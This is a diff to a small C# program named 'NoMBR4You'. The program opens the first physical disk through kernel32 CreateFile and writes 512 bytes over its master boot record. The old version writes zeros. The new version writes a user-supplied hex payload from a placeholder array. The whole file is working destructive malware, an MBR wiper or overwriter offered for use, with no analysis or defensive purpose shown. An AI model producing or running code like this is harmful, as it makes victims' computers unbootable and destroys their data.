@@ -1,6 +1,8 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading.Tasks;
 
 namespace NoMBR4You
@@ -11,15 +13,14 @@ namespace NoMBR4You
         /// The main entry point for the application.
         /// </summary>
         [STAThread]
-        static void Main()
+        static void Main(string[] args)
         {
-            byte[] newData = new byte[512];
+            byte[] mbrData = {/*Your Hex String Here*/};
 
-            IntPtr mbrPointer = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x1 | (uint)0x2, z, 0x3, 0, z);
+            var mbr = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x1 | (uint)0x2, IntPtr.Zero, 0x3, 0, IntPtr.Zero);
 
-            WriteFile(mbrPointer, newData, 512, out uint lpNumberOfBytesWritten, z);
+            WriteFile(mbr, mbrData, 512, out uint lpNumberOfBytesWritten, IntPtr.Zero);
         }
-        private static readonly IntPtr z = IntPtr.Zero;
         [DllImport("kernel32")]
         private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
 
